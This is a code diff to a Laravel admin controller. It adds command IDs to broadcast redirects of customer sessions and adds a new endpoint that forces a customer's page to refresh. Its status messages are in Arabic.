@@ -352,6 +352,10 @@ class AdminCustomerController extends Controller
 
         $customer->update(['current_page' => $request->redirect_url]);
 
+        // Generate a unique command ID for this redirect operation to prevent
+        // duplicate processing when multiple redirects are sent rapidly.
+        $commandId = \Illuminate\Support\Str::ulid();
+
         // Cache pending redirect so the customer's heartbeat can pick it up
         // even if WebSocket is unavailable (polling fallback — TTL 120s).
         if ($customer->session_id) {
@@ -361,7 +365,7 @@ class AdminCustomerController extends Controller
                 120
             );
 
-            broadcast(new CustomerRedirected($customer->session_id, $request->redirect_url, $customer->id))->toOthers();
+            broadcast(new CustomerRedirected($customer->session_id, $request->redirect_url, $customer->id, $commandId))->toOthers();
         }
 
         $this->notifyDashboard($customer, 'customer_redirected');
@@ -369,6 +373,50 @@ class AdminCustomerController extends Controller
         return response()->json([
             'success' => true,
             'message' => 'تم توجيه العميل بنجاح',
+            'command_id' => $commandId,
+        ]);
+    }
+
+    /**
+     * Force refresh a customer's current page.
+     *
+     * This endpoint broadcasts a ForcePageRefresh event that clears temporary
+     * redirect markers (adminRedirectTarget, adminRedirectInProgress) and
+     * performs a hard page reload on the customer side.
+     *
+     * Use this as a safety valve when successive redirects don't work correctly,
+     * or when you need to fully reset the customer's view without changing pages.
+     *
+     * @param  \App\Http\Requests\Admin\RefreshCustomerPageRequest  $request
+     * @return \Illuminate\Http\JsonResponse
+     */
+    public function forceRefreshCustomerPage(\App\Http\Requests\Admin\RefreshCustomerPageRequest $request): \Illuminate\Http\JsonResponse
+    {
+        $customer = CustomerProfile::findOrFail($request->integer('customer_id'));
+
+        if (!$customer->session_id) {
+            return response()->json([
+                'success' => false,
+                'message' => 'العميل لا يملك جلسة نشطة',
+            ], 422);
+        }
+
+        // Generate unique command ID to prevent duplicate refresh commands
+        $commandId = \Illuminate\Support\Str::ulid();
+
+        // Broadcast the refresh event to the customer
+        broadcast(new \App\Events\ForcePageRefresh(
+            $customer->session_id,
+            $customer->id,
+            $commandId
+        ))->toOthers();
+
+        $this->notifyDashboard($customer, 'customer_refreshed');
+
+        return response()->json([
+            'success' => true,
+            'message' => 'تم طلب إعادة تحميل صفحة العميل',
+            'command_id' => $commandId,
         ]);
     }
 
